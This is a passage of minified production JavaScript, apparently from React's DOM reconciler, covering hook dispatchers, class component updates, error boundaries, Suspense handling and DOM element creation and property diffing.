l=Re;Re=l!==0&&4>l?l:4,t(!0);var u=Ol.transition;Ol.transition={};try{t(!1),r()}finally{Re=l,Ol.transition=u}}function Ih(){return Gt().memoizedState}function Tx(t,r,l){var u=ts(t);if(l={lane:u,action:l,hasEagerState:!1,eagerState:null,next:null},Lh(t))Oh(r,l);else if(l=hh(t,r,l,u),l!==null){var h=Nt();nr(l,t,u,h),Dh(l,r,u)}}function Px(t,r,l){var u=ts(t),h={lane:u,action:l,hasEagerState:!1,eagerState:null,next:null};if(Lh(t))Oh(r,h);else{var g=t.alternate;if(t.lanes===0&&(g===null||g.lanes===0)&&(g=r.lastRenderedReducer,g!==null))try{var y=r.lastRenderedState,_=g(y,l);if(h.hasEagerState=!0,h.eagerState=_,Zt(_,y)){var A=r.interleaved;A===null?(h.next=h,Cl(r)):(h.next=A.next,A.next=h),r.interleaved=h;return}}catch{}l=hh(t,r,h,u),l!==null&&(h=Nt(),nr(l,t,u,h),Dh(l,r,u))}}function Lh(t){var r=t.alternate;return t===Ve||r!==null&&r===Ve}function Oh(t,r){ga=Pi=!0;var l=t.pending;l===null?r.next=r:(r.next=l.next,l.next=r),t.pending=r}function Dh(t,r,l){if((l&4194240)!==0){var u=r.lanes;u&=t.pendingLanes,l|=u,r.lanes=l,Vo(t,l)}}var Li={readContext:Ht,useCallback:ht,useContext:ht,useEffect:ht,useImperativeHandle:ht,useInsertionEffect:ht,useLayoutEffect:ht,useMemo:ht,useReducer:ht,useRef:ht,useState:ht,useDebugValue:ht,useDeferredValue:ht,useTransition:ht,useMutableSource:ht,useSyncExternalStore:ht,useId:ht,unstable_isNewReconciler:!1},Rx={readContext:Ht,useCallback:function(t,r){return fr().memoizedState=[t,r===void 0?null:r],t},useContext:Ht,useEffect:_h,useImperativeHandle:function(t,r,l){return l=l!=null?l.concat([t]):null,Ri(4194308,4,Eh.bind(null,r,t),l)},useLayoutEffect:function(t,r){return Ri(4194308,4,t,r)},useInsertionEffect:function(t,r){return Ri(4,2,t,r)},useMemo:function(t,r){var l=fr();return r=r===void 0?null:r,t=t(),l.memoizedState=[t,r],t},useReducer:function(t,r,l){var u=fr();return r=l!==void 0?l(r):r,u.memoizedState=u.baseState=r,t={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:t,lastRenderedState:r},u.queue=t,t=t.dispatch=Tx.bind(null,Ve,t),[u.memoizedState,t]},useRef:function(t){var r=fr();return t={current:t},r.memoizedState=t},useState:kh,useDebugValue:ql,useDeferredValue:function(t){return fr().memoizedState=t},useTransition:function(){var t=kh(!1),r=t[0];return t=Cx.bind(null,t[1]),fr().memoizedState=t,[r,t]},useMutableSource:function(){},useSyncExternalStore:function(t,r,l){var u=Ve,h=fr();if(Ue){if(l===void 0)throw Error(s(407));l=l()}else{if(l=r(),nt===null)throw Error(s(349));(Es&30)!==0||vh(u,r,l)}h.memoizedState=l;var g={value:l,getSnapshot:r};return h.queue=g,_h(wh.bind(null,u,g,t),[t]),u.flags|=2048,ya(9,yh.bind(null,u,g,l,r),void 0,null),l},useId:function(){var t=fr(),r=nt.identifierPrefix;if(Ue){var l=Nr,u=jr;l=(u&~(1<<32-Xt(u)-1)).toString(32)+l,r=":"+r+"R"+l,l=ba++,0<l&&(r+="H"+l.toString(32)),r+=":"}else l=Ex++,r=":"+r+"r"+l.toString(32)+":";return t.memoizedState=r},unstable_isNewReconciler:!1},Ix={readContext:Ht,useCallback:Th,useContext:Ht,useEffect:zl,useImperativeHandle:Ch,useInsertionEffect:Sh,useLayoutEffect:Ah,useMemo:Ph,useReducer:Bl,useRef:Fh,useState:function(){return Bl(va)},useDebugValue:ql,useDeferredValue:function(t){var r=Gt();return Rh(r,Xe.memoizedState,t)},useTransition:function(){var t=Bl(va)[0],r=Gt().memoizedState;return[t,r]},useMutableSource:gh,useSyncExternalStore:bh,useId:Ih,unstable_isNewReconciler:!1},Lx={readContext:Ht,useCallback:Th,useContext:Ht,useEffect:zl,useImperativeHandle:Ch,useInsertionEffect:Sh,useLayoutEffect:Ah,useMemo:Ph,useReducer:Ul,useRef:Fh,useState:function(){return Ul(va)},useDebugValue:ql,useDeferredValue:function(t){var r=Gt();return Xe===null?r.memoizedState=t:Rh(r,Xe.memoizedState,t)},useTransition:function(){var t=Ul(va)[0],r=Gt().memoizedState;return[t,r]},useMutableSource:gh,useSyncExternalStore:bh,useId:Ih,unstable_isNewReconciler:!1};function tr(t,r){if(t&&t.defaultProps){r=Q({},r),t=t.defaultProps;for(var l in t)r[l]===void 0&&(r[l]=t[l]);return r}return r}function Wl(t,r,l,u){r=t.memoizedState,l=l(u,r),l=l==null?r:Q({},r,l),t.memoizedState=l,t.lanes===0&&(t.updateQueue.baseState=l)}var Oi={isMounted:function(t){return(t=t._reactInternals)?js(t)===t:!1},enqueueSetState:function(t,r,l){t=t._reactInternals;var u=Nt(),h=ts(t),g=Fr(u,h);g.payload=r,l!=null&&(g.callback=l),r=Jr(t,g,h),r!==null&&(nr(r,t,h,u),Ai(r,t,h))},enqueueReplaceState:function(t,r,l){t=t._reactInternals;var u=Nt(),h=ts(t),g=Fr(u,h);g.tag=1,g.payload=r,l!=null&&(g.callback=l),r=Jr(t,g,h),r!==null&&(nr(r,t,h,u),Ai(r,t,h))},enqueueForceUpdate:function(t,r){t=t._reactInternals;var l=Nt(),u=ts(t),h=Fr(l,u);h.tag=2,r!=null&&(h.callback=r),r=Jr(t,h,u),r!==null&&(nr(r,t,u,l),Ai(r,t,u))}};function Mh(t,r,l,u,h,g,y){return t=t.stateNode,typeof t.shouldComponentUpdate=="function"?t.shouldComponentUpdate(u,g,y):r.prototype&&r.prototype.isPureReactComponent?!ia(l,u)||!ia(h,g):!0}function $h(t,r,l){var u=!1,h=Qr,g=r.contextType;return typeof g=="object"&&g!==null?g=Ht(g):(h=_t(r)?ks:ut.current,u=r.contextTypes,g=(u=u!=null)?tn(t,h):Qr),r=new r(l,g),t.memoizedState=r.state!==null&&r.state!==void 0?r.state:null,r.updater=Oi,t.stateNode=r,r._reactInternals=t,u&&(t=t.stateNode,t.__reactInternalMemoizedUnmaskedChildContext=h,t.__reactInternalMemoizedMaskedChildContext=g),r}function Bh(t,r,l,u){t=r.state,typeof r.componentWillReceiveProps=="function"&&r.componentWillReceiveProps(l,u),typeof r.UNSAFE_componentWillReceiveProps=="function"&&r.UNSAFE_componentWillReceiveProps(l,u),r.state!==t&&Oi.enqueueReplaceState(r,r.state,null)}function Vl(t,r,l,u){var h=t.stateNode;h.props=l,h.state=t.memoizedState,h.refs={},Tl(t);var g=r.contextType;typeof g=="object"&&g!==null?h.context=Ht(g):(g=_t(r)?ks:ut.current,h.context=tn(t,g)),h.state=t.memoizedState,g=r.getDerivedStateFromProps,typeof g=="function"&&(Wl(t,r,g,l),h.state=t.memoizedState),typeof r.getDerivedStateFromProps=="function"||typeof h.getSnapshotBeforeUpdate=="function"||typeof h.UNSAFE_componentWillMount!="function"&&typeof h.componentWillMount!="function"||(r=h.state,typeof h.componentWillMount=="function"&&h.componentWillMount(),typeof h.UNSAFE_componentWillMount=="function"&&h.UNSAFE_componentWillMount(),r!==h.state&&Oi.enqueueReplaceState(h,h.state,null),Ei(t,l,h,u),h.state=t.memoizedState),typeof h.componentDidMount=="function"&&(t.flags|=4194308)}function dn(t,r){try{var l="",u=r;do l+=le(u),u=u.return;while(u);var h=l}catch(g){h=`
Error generating stack: `+g.message+`
`+g.stack}return{value:t,source:r,stack:h,digest:null}}function Hl(t,r,l){return{value:t,source:null,stack:l??null,digest:r??null}}function Gl(t,r){try{console.error(r.value)}catch(l){setTimeout(function(){throw l})}}var Ox=typeof WeakMap=="function"?WeakMap:Map;function Uh(t,r,l){l=Fr(-1,l),l.tag=3,l.payload={element:null};var u=r.value;return l.callback=function(){qi||(qi=!0,lc=u),Gl(t,r)},l}function zh(t,r,l){l=Fr(-1,l),l.tag=3;var u=t.type.getDerivedStateFromError;if(typeof u=="function"){var h=r.value;l.payload=function(){return u(h)},l.callback=function(){Gl(t,r)}}var g=t.stateNode;return g!==null&&typeof g.componentDidCatch=="function"&&(l.callback=function(){Gl(t,r),typeof u!="function"&&(Zr===null?Zr=new Set([this]):Zr.add(this));var y=r.stack;this.componentDidCatch(r.value,{componentStack:y!==null?y:""})}),l}function qh(t,r,l){var u=t.pingCache;if(u===null){u=t.pingCache=new Ox;var h=new Set;u.set(r,h)}else h=u.get(r),h===void 0&&(h=new Set,u.set(r,h));h.has(l)||(h.add(l),t=Yx.bind(null,t,r,l),r.then(t,t))}function Wh(t){do{var r;if((r=t.tag===13)&&(r=t.memoizedState,r=r!==null?r.dehydrated!==null:!0),r)return t;t=t.return}while(t!==null);return null}function Vh(t,r,l,u,h){return(t.mode&1)===0?(t===r?t.flags|=65536:(t.flags|=128,l.flags|=131072,l.flags&=-52805,l.tag===1&&(l.alternate===null?l.tag=17:(r=Fr(-1,1),r.tag=2,Jr(l,r,1))),l.lanes|=1),t):(t.flags|=65536,t.lanes=h,t)}var Dx=U.ReactCurrentOwner,St=!1;function jt(t,r,l,u){r.child=t===null?uh(r,null,l,u):an(r,t.child,l,u)}function Hh(t,r,l,u,h){l=l.render;var g=r.ref;return ln(r,h),u=Ml(t,r,l,u,g,h),l=$l(),t!==null&&!St?(r.updateQueue=t.updateQueue,r.flags&=-2053,t.lanes&=~h,_r(t,r,h)):(Ue&&l&&wl(r),r.flags|=1,jt(t,r,u,h),r.child)}function Gh(t,r,l,u,h){if(t===null){var g=l.type;return typeof g=="function"&&!pc(g)&&g.defaultProps===void 0&&l.compare===null&&l.defaultProps===void 0?(r.tag=15,r.type=g,Qh(t,r,g,u,h)):(t=Ki(l.type,null,u,r,r.mode,h),t.ref=r.ref,t.return=r,r.child=t)}if(g=t.child,(t.lanes&h)===0){var y=g.memoizedProps;if(l=l.compare,l=l!==null?l:ia,l(y,u)&&t.ref===r.ref)return _r(t,r,h)}return r.flags|=1,t=ss(g,u),t.ref=r.ref,t.return=r,r.child=t}function Qh(t,r,l,u,h){if(t!==null){var g=t.memoizedProps;if(ia(g,u)&&t.ref===r.ref)if(St=!1,r.pendingProps=u=g,(t.lanes&h)!==0)(t.flags&131072)!==0&&(St=!0);else return r.lanes=t.lanes,_r(t,r,h)}return Ql(t,r,l,u,h)}function Kh(t,r,l){var u=r.pendingProps,h=u.children,g=t!==null?t.memoizedState:null;if(u.mode==="hidden")if((r.mode&1)===0)r.memoizedState={baseLanes:0,cachePool:null,transitions:null},De(hn,Ot),Ot|=l;else{if((l&1073741824)===0)return t=g!==null?g.baseLanes|l:l,r.lanes=r.childLanes=1073741824,r.memoizedState={baseLanes:t,cachePool:null,transitions:null},r.updateQueue=null,De(hn,Ot),Ot|=t,null;r.memoizedState={baseLanes:0,cachePool:null,transitions:null},u=g!==null?g.baseLanes:l,De(hn,Ot),Ot|=u}else g!==null?(u=g.baseLanes|l,r.memoizedState=null):u=l,De(hn,Ot),Ot|=u;return jt(t,r,h,l),r.child}function Yh(t,r){var l=r.ref;(t===null&&l!==null||t!==null&&t.ref!==l)&&(r.flags|=512,r.flags|=2097152)}function Ql(t,r,l,u,h){var g=_t(l)?ks:ut.current;return g=tn(r,g),ln(r,h),l=Ml(t,r,l,u,g,h),u=$l(),t!==null&&!St?(r.updateQueue=t.updateQueue,r.flags&=-2053,t.lanes&=~h,_r(t,r,h)):(Ue&&u&&wl(r),r.flags|=1,jt(t,r,l,h),r.child)}function Jh(t,r,l,u,h){if(_t(l)){var g=!0;yi(r)}else g=!1;if(ln(r,h),r.stateNode===null)Mi(t,r),$h(r,l,u),Vl(r,l,u,h),u=!0;else if(t===null){var y=r.stateNode,_=r.memoizedProps;y.props=_;var A=y.context,$=l.contextType;typeof $=="object"&&$!==null?$=Ht($):($=_t(l)?ks:ut.current,$=tn(r,$));var J=l.getDerivedStateFromProps,X=typeof J=="function"||typeof y.getSnapshotBeforeUpdate=="function";X||typeof y.UNSAFE_componentWillReceiveProps!="function"&&typeof y.componentWillReceiveProps!="function"||(_!==u||A!==$)&&Bh(r,y,u,$),Yr=!1;var Y=r.memoizedState;y.state=Y,Ei(r,u,y,h),A=r.memoizedState,_!==u||Y!==A||Ft.current||Yr?(typeof J=="function"&&(Wl(r,l,J,u),A=r.memoizedState),(_=Yr||Mh(r,l,_,u,Y,A,$))?(X||typeof y.UNSAFE_componentWillMount!="function"&&typeof y.componentWillMount!="function"||(typeof y.componentWillMount=="function"&&y.componentWillMount(),typeof y.UNSAFE_componentWillMount=="function"&&y.UNSAFE_componentWillMount()),typeof y.componentDidMount=="function"&&(r.flags|=4194308)):(typeof y.componentDidMount=="function"&&(r.flags|=4194308),r.memoizedProps=u,r.memoizedState=A),y.props=u,y.state=A,y.context=$,u=_):(typeof y.componentDidMount=="function"&&(r.flags|=4194308),u=!1)}else{y=r.stateNode,fh(t,r),_=r.memoizedProps,$=r.type===r.elementType?_:tr(r.type,_),y.props=$,X=r.pendingProps,Y=y.context,A=l.contextType,typeof A=="object"&&A!==null?A=Ht(A):(A=_t(l)?ks:ut.current,A=tn(r,A));var oe=l.getDerivedStateFromProps;(J=typeof oe=="function"||typeof y.getSnapshotBeforeUpdate=="function")||typeof y.UNSAFE_componentWillReceiveProps!="function"&&typeof y.componentWillReceiveProps!="function"||(_!==X||Y!==A)&&Bh(r,y,u,A),Yr=!1,Y=r.memoizedState,y.state=Y,Ei(r,u,y,h);var de=r.memoizedState;_!==X||Y!==de||Ft.current||Yr?(typeof oe=="function"&&(Wl(r,l,oe,u),de=r.memoizedState),($=Yr||Mh(r,l,$,u,Y,de,A)||!1)?(J||typeof y.UNSAFE_componentWillUpdate!="function"&&typeof y.componentWillUpdate!="function"||(typeof y.componentWillUpdate=="function"&&y.componentWillUpdate(u,de,A),typeof y.UNSAFE_componentWillUpdate=="function"&&y.UNSAFE_componentWillUpdate(u,de,A)),typeof y.componentDidUpdate=="function"&&(r.flags|=4),typeof y.getSnapshotBeforeUpdate=="function"&&(r.flags|=1024)):(typeof y.componentDidUpdate!="function"||_===t.memoizedProps&&Y===t.memoizedState||(r.flags|=4),typeof y.getSnapshotBeforeUpdate!="function"||_===t.memoizedProps&&Y===t.memoizedState||(r.flags|=1024),r.memoizedProps=u,r.memoizedState=de),y.props=u,y.state=de,y.context=A,u=$):(typeof y.componentDidUpdate!="function"||_===t.memoizedProps&&Y===t.memoizedState||(r.flags|=4),typeof y.getSnapshotBeforeUpdate!="function"||_===t.memoizedProps&&Y===t.memoizedState||(r.flags|=1024),u=!1)}return Kl(t,r,l,u,g,h)}function Kl(t,r,l,u,h,g){Yh(t,r);var y=(r.flags&128)!==0;if(!u&&!y)return h&&rh(r,l,!1),_r(t,r,g);u=r.stateNode,Dx.current=r;var _=y&&typeof l.getDerivedStateFromError!="function"?null:u.render();return r.flags|=1,t!==null&&y?(r.child=an(r,t.child,null,g),r.child=an(r,null,_,g)):jt(t,r,_,g),r.memoizedState=u.state,h&&rh(r,l,!0),r.child}function Xh(t){var r=t.stateNode;r.pendingContext?eh(t,r.pendingContext,r.pendingContext!==r.context):r.context&&eh(t,r.context,!1),Pl(t,r.containerInfo)}function Zh(t,r,l,u,h){return nn(),Fl(h),r.flags|=256,jt(t,r,l,u),r.child}var Yl={dehydrated:null,treeContext:null,retryLane:0};function Jl(t){return{baseLanes:t,cachePool:null,transitions:null}}function ef(t,r,l){var u=r.pendingProps,h=We.current,g=!1,y=(r.flags&128)!==0,_;if((_=y)||(_=t!==null&&t.memoizedState===null?!1:(h&2)!==0),_?(g=!0,r.flags&=-129):(t===null||t.memoizedState!==null)&&(h|=1),De(We,h&1),t===null)return kl(r),t=r.memoizedState,t!==null&&(t=t.dehydrated,t!==null)?((r.mode&1)===0?r.lanes=1:t.data==="$!"?r.lanes=8:r.lanes=1073741824,null):(y=u.children,t=u.fallback,g?(u=r.mode,g=r.child,y={mode:"hidden",children:y},(u&1)===0&&g!==null?(g.childLanes=0,g.pendingProps=y):g=Yi(y,u,0,null),t=Is(t,u,l,null),g.return=r,t.return=r,g.sibling=t,r.child=g,r.child.memoizedState=Jl(l),r.memoizedState=Yl,t):Xl(r,y));if(h=t.memoizedState,h!==null&&(_=h.dehydrated,_!==null))return Mx(t,r,y,u,_,h,l);if(g){g=u.fallback,y=r.mode,h=t.child,_=h.sibling;var A={mode:"hidden",children:u.children};return(y&1)===0&&r.child!==h?(u=r.child,u.childLanes=0,u.pendingProps=A,r.deletions=null):(u=ss(h,A),u.subtreeFlags=h.subtreeFlags&14680064),_!==null?g=ss(_,g):(g=Is(g,y,l,null),g.flags|=2),g.return=r,u.return=r,u.sibling=g,r.child=u,u=g,g=r.child,y=t.child.memoizedState,y=y===null?Jl(l):{baseLanes:y.baseLanes|l,cachePool:null,transitions:y.transitions},g.memoizedState=y,g.childLanes=t.childLanes&~l,r.memoizedState=Yl,u}return g=t.child,t=g.sibling,u=ss(g,{mode:"visible",children:u.children}),(r.mode&1)===0&&(u.lanes=l),u.return=r,u.sibling=null,t!==null&&(l=r.deletions,l===null?(r.deletions=[t],r.flags|=16):l.push(t)),r.child=u,r.memoizedState=null,u}function Xl(t,r){return r=Yi({mode:"visible",children:r},t.mode,0,null),r.return=t,t.child=r}function Di(t,r,l,u){return u!==null&&Fl(u),an(r,t.child,null,l),t=Xl(r,r.pendingProps.children),t.flags|=2,r.memoizedState=null,t}function Mx(t,r,l,u,h,g,y){if(l)return r.flags&256?(r.flags&=-257,u=Hl(Error(s(422))),Di(t,r,y,u)):r.memoizedState!==null?(r.child=t.child,r.flags|=128,null):(g=u.fallback,h=r.mode,u=Yi({mode:"visible",children:u.children},h,0,null),g=Is(g,h,y,null),g.flags|=2,u.return=r,g.return=r,u.sibling=g,r.child=u,(r.mode&1)!==0&&an(r,t.child,null,y),r.child.memoizedState=Jl(y),r.memoizedState=Yl,g);if((r.mode&1)===0)return Di(t,r,y,null);if(h.data==="$!"){if(u=h.nextSibling&&h.nextSibling.dataset,u)var _=u.dgst;return u=_,g=Error(s(419)),u=Hl(g,u,void 0),Di(t,r,y,u)}if(_=(y&t.childLanes)!==0,St||_){if(u=nt,u!==null){switch(y&-y){case 4:h=2;break;case 16:h=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:h=32;break;case 536870912:h=268435456;break;default:h=0}h=(h&(u.suspendedLanes|y))!==0?0:h,h!==0&&h!==g.retryLane&&(g.retryLane=h,kr(t,h),nr(u,t,h,-1))}return mc(),u=Hl(Error(s(421))),Di(t,r,y,u)}return h.data==="$?"?(r.flags|=128,r.child=t.child,r=Jx.bind(null,t),h._reactRetry=r,null):(t=g.treeContext,Lt=Hr(h.nextSibling),It=r,Ue=!0,er=null,t!==null&&(Wt[Vt++]=jr,Wt[Vt++]=Nr,Wt[Vt++]=Fs,jr=t.id,Nr=t.overflow,Fs=r),r=Xl(r,u.children),r.flags|=4096,r)}function tf(t,r,l){t.lanes|=r;var u=t.alternate;u!==null&&(u.lanes|=r),El(t.return,r,l)}function Zl(t,r,l,u,h){var g=t.memoizedState;g===null?t.memoizedState={isBackwards:r,rendering:null,renderingStartTime:0,last:u,tail:l,tailMode:h}:(g.isBackwards=r,g.rendering=null,g.renderingStartTime=0,g.last=u,g.tail=l,g.tailMode=h)}function rf(t,r,l){var u=r.pendingProps,h=u.revealOrder,g=u.tail;if(jt(t,r,u.children,l),u=We.current,(u&2)!==0)u=u&1|2,r.flags|=128;else{if(t!==null&&(t.flags&128)!==0)e:for(t=r.child;t!==null;){if(t.tag===13)t.memoizedState!==null&&tf(t,l,r);else if(t.tag===19)tf(t,l,r);else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===r)break e;for(;t.sibling===null;){if(t.return===null||t.return===r)break e;t=t.return}t.sibling.return=t.return,t=t.sibling}u&=1}if(De(We,u),(r.mode&1)===0)r.memoizedState=null;else switch(h){case"forwards":for(l=r.child,h=null;l!==null;)t=l.alternate,t!==null&&Ci(t)===null&&(h=l),l=l.sibling;l=h,l===null?(h=r.child,r.child=null):(h=l.sibling,l.sibling=null),Zl(r,!1,h,l,g);break;case"backwards":for(l=null,h=r.child,r.child=null;h!==null;){if(t=h.alternate,t!==null&&Ci(t)===null){r.child=h;break}t=h.sibling,h.sibling=l,l=h,h=t}Zl(r,!0,l,null,g);break;case"together":Zl(r,!1,null,null,void 0);break;default:r.memoizedState=null}return r.child}function Mi(t,r){(r.mode&1)===0&&t!==null&&(t.alternate=null,r.alternate=null,r.flags|=2)}function _r(t,r,l){if(t!==null&&(r.dependencies=t.dependencies),Cs|=r.lanes,(l&r.childLanes)===0)return null;if(t!==null&&r.child!==t.child)throw Error(s(153));if(r.child!==null){for(t=r.child,l=ss(t,t.pendingProps),r.child=l,l.return=r;t.sibling!==null;)t=t.sibling,l=l.sibling=ss(t,t.pendingProps),l.return=r;l.sibling=null}return r.child}function $x(t,r,l){switch(r.tag){case 3:Xh(r),nn();break;case 5:xh(r);break;case 1:_t(r.type)&&yi(r);break;case 4:Pl(r,r.stateNode.containerInfo);break;case 10:var u=r.type._context,h=r.memoizedProps.value;De(_i,u._currentValue),u._currentValue=h;break;case 13:if(u=r.memoizedState,u!==null)return u.dehydrated!==null?(De(We,We.current&1),r.flags|=128,null):(l&r.child.childLanes)!==0?ef(t,r,l):(De(We,We.current&1),t=_r(t,r,l),t!==null?t.sibling:null);De(We,We.current&1);break;case 19:if(u=(l&r.childLanes)!==0,(t.flags&128)!==0){if(u)return rf(t,r,l);r.flags|=128}if(h=r.memoizedState,h!==null&&(h.rendering=null,h.tail=null,h.lastEffect=null),De(We,We.current),u)break;return null;case 22:case 23:return r.lanes=0,Kh(t,r,l)}return _r(t,r,l)}var sf,ec,nf,af;sf=function(t,r){for(var l=r.child;l!==null;){if(l.tag===5||l.tag===6)t.appendChild(l.stateNode);else if(l.tag!==4&&l.child!==null){l.child.return=l,l=l.child;continue}if(l===r)break;for(;l.sibling===null;){if(l.return===null||l.return===r)return;l=l.return}l.sibling.return=l.return,l=l.sibling}},ec=function(){},nf=function(t,r,l,u){var h=t.memoizedProps;if(h!==u){t=r.stateNode,As(hr.current);var g=null;switch(l){case"input":h=be(t,h),u=be(t,u),g=[];break;case"select":h=Q({},h,{value:void 0}),u=Q({},u,{value:void 0}),g=[];break;case"textarea":h=$r(t,h),u=$r(t,u),g=[];break;default:typeof h.onClick!="function"&&typeof u.onClick=="function"&&(t.onclick=gi)}Io(l,u);var y;l=null;for($ in h)if(!u.hasOwnProperty($)&&h.hasOwnProperty($)&&h[$]!=null)if($==="style"){var _=h[$];for(y in _)_.hasOwnProperty(y)&&(l||(l={}),l[y]="")}else $!=="dangerouslySetInnerHTML"&&$!=="children"&&$!=="suppressContentEditableWarning"&&$!=="suppressHydrationWarning"&&$!=="autoFocus"&&(o.hasOwnProperty($)?g||(g=[]):(g=g||[]).push($,null));for($ in u){var A=u[$];if(_=h?.[$],u.hasOwnProperty($)&&A!==_&&(A!=null||_!=null))if($==="style")if(_){for(y in _)!_.hasOwnProperty(y)||A&&A.hasOwnProperty(y)||(l||(l={}),l[y]="");for(y in A)A.hasOwnProperty(y)&&_[y]!==A[y]&&(l||(l={}),l[y]=A[y])}else l||(g||(g=[]),g.push($,l)),l=A;else $==="dangerouslySetInnerHTML"?(A=A?A.__html:void 0,_=_?_.__html:void 0,A!=null&&_!==A&&(g=g||[]).push($,A)):$==="children"?typeof A!="string"&&typeof A!="number"||(g=g||[]).push($,""+A):$!=="suppressContentEditableWarning"&&$!=="suppressHydrationWarning"&&(o.hasOwnProperty($)?(A!=null&&$==="onScroll"&&$e("scroll",t),g||_===A||(g=[])):(g=g||[]).push($,A))}l&&(g=g||[]).push("style",l);var $=g;(r.updateQueue=$)&&(r.flags|=4)}},af=function(t,r,l,u){l!==u&&(r.flags|=4)};function wa(t,r){if(!Ue)switch(t.tailMode){case"hidden":r=t.tail;for(var l=null;r!==null;)r.alternate!==null&&(l=r),r=r.sibling;l===null?t.tail=null:l.sibling=null;break;case"collapsed":l=t.tail;for(var u=null;l!==null;)l.alternate!==null&&(u=l),l=l.sibling;u===null?r||t.tail===null?t.tail=null:t.tail.sibling=null:u.sibling=null}}function ft(t){var r=t.alternate!==null&&t.alternate.child===t.child,l=0,u=0;if(r)for(var h=t.child;h!==null;)l|=h.lanes|h.childLanes,u|=h.subtreeFlags&14680064,u|=h.flags&14680064,h.return=t,h=h.sibling;else for(h=t.child;h!==null;)l|=h.lanes|h.childLanes,u|=h.subtreeFlags,u|=h.flags,h.return=t,h=h.sibling;return t.subtreeFlags|=u,t.childLanes=l,r}function Bx(t,r,l){var u=r.pendingProps;switch(jl(r),r.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return ft(r),null;case 1:return _t(r.type)&&vi(),ft(r),null;case 3:return u=r.stateNode,cn(),Be(Ft),Be(ut),Ll(),u.pendingContext&&(u.context=u.pendingContext,u.pendingContext=null),(t===null||t.child===null)&&(ki(r)?r.flags|=4:t===null||t.memoizedState.isDehydrated&&(r.flags&256)===0||(r.flags|=1024,er!==null&&(uc(er),er=null))),ec(t,r),ft(r),null;case 5:Rl(r);var h=As(xa.current);if(l=r.type,t!==null&&r.stateNode!=null)nf(t,r,l,u,h),t.ref!==r.ref&&(r.flags|=512,r.flags|=2097152);else{if(!u){if(r.stateNode===null)throw Error(s(166));return ft(r),null}if(t=As(hr.current),ki(r)){u=r.stateNode,l=r.type;var g=r.memoizedProps;switch(u[ur]=r,u[ua]=g,t=(r.mode&1)!==0,l){case"dialog":$e("cancel",u),$e("close",u);break;case"iframe":case"object":case"embed":$e("load",u);break;case"video":case"audio":for(h=0;h<la.length;h++)$e(la[h],u);break;case"source":$e("error",u);break;case"img":case"image":case"link":$e("error",u),$e("load",u);break;case"details":$e("toggle",u);break;case"input":ge(u,g),$e("invalid",u);break;case"select":u._wrapperState={wasMultiple:!!g.multiple},$e("invalid",u);break;case"textarea":zd(u,g),$e("invalid",u)}Io(l,g),h=null;for(var y in g)if(g.hasOwnProperty(y)){var _=g[y];y==="children"?typeof _=="string"?u.textContent!==_&&(g.suppressHydrationWarning!==!0&&xi(u.textContent,_,t),h=["children",_]):typeof _=="number"&&u.textContent!==""+_&&(g.suppressHydrationWarning!==!0&&xi(u.textContent,_,t),h=["children",""+_]):o.hasOwnProperty(y)&&_!=null&&y==="onScroll"&&$e("scroll",u)}switch(l){case"input":kt(u),wt(u,g,!0);break;case"textarea":kt(u),Wd(u);break;case"select":case"option":break;default:typeof g.onClick=="function"&&(u.onclick=gi)}u=h,r.updateQueue=u,u!==null&&(r.flags|=4)}else{y=h.nodeType===9?h:h.ownerDocument,t==="http://www.w3.org/1999/xhtml"&&(t=Vd(l)),t==="http://www.w3.org/1999/xhtml"?l==="script"?(t=y.createElement("div"),t.innerHTML="<script><\/script>",t=t.removeChild(t.firstChild)):typeof u.is=="string"?t=y.createElement(l,{is:u.is}):(t=y.createElement(l),l==="select"&&(y=t,u.multiple?y.multiple=!0:u.size&&(y.size=u.size))):t=y.createElementNS(t,l),t[ur]=r,t[ua]=u,sf(t,r,!1,!1),r.stateNode=t;e:{switch(y=Lo(l,u),l){case"dialog":$e("cancel",t),$e("close",t),h=u;break;case"iframe":case"object":case"embed":$e("load",t),h=u;break;case"video":case"audio":for(h=0;h<la.length;h++)$e(la[h],t);h=u;break;case"source":$e("error",t),h=u;break;case"img":case"image":case"link":$e("error",t),$e("load",t),h=u;break;case"details":$e("toggle",t),h=u;break;case"input":ge(t,u),h=be(t,u),$e("invalid",t);break;case"option":h=u;break;case"select":t._wrapperState={wasMultiple:!!u.multiple},h=Q({},u,{value:void 0}),$e("invalid",t);break;case"textarea":zd(t,u),h=$r(t,u),$e("invalid",t);break;default:h=u}Io(l,h),_=h;for(g in _)if(_.hasOwnProperty(g)){var A=_[g];g==="style"?Qd(t,A):g==="dangerouslySetInnerHTML"?(A=A?A.__html:void 0,A!=null&&Hd(t,A)):g==="children"?typeof A=="string"?(l!=="textarea"||A!=="")&&qn(t,A):typeof A=="number"&&qn(t,""+A):g!=="suppressContentEditableWarning"&&g!=="suppressHydrationWarning"&&g!=="autoFocus"&&(o.hasOwnProperty(g)?A!=null&&g==="onScroll"&&$e("scroll",t):A!=null&&S(t,g,A,y))}switch(l){case"input":kt(t),wt(t,u,!1);break;case"textarea":kt(t),Wd(t);break;case"option":u.value!=null&&t.setAttribute("value",""+ve(u.value));break;case"select":t.multiple=!!u.multiple,g=u.value,g!=null?vr(t,!!u.multiple,g,!1):u.defaultValue!=null&&vr(t,!!u.multiple,u.defaultValue,!0);break;default:typeof h.onClick=="function"&&(t.onclick=gi)}switch(l){case"button":case"input":case"select":case"textarea":u=!!u.autoFocus;break e;case"img":u=!0;break e;default:u=!1}}u&&(r.flags|=4)}r.ref!==null&&(r.flags|=512,r.flags|=2097152)}return ft(r),null;case 6:if(t&&r.stateNode!=null)af(t,r,t.memoizedProps,u);else{if(typeof u!="string"&&r.stateNode===null)throw Error(s(166));if(l=As(xa.current),As(hr.current),ki(r)){if(u=r.stateNode,l=r.memoizedProps,u[ur]=r,(g=u.nodeValue!==l)&&(t=It,t!==null))switch(t.tag){case 3:xi(u.nodeValue,l,(t.mode&1)!==0);break;case 5:t.memoizedProps.suppressHydrationWarning!==!0&&xi(u.nodeValue,l,(t.mode&1)!==0)}g&&(r.flags|=4)}else u=(l.nodeType===9?l:l.ownerDocument).createTextNode(u),u[ur]=r,r.stateNode=u}return ft(r),null;case 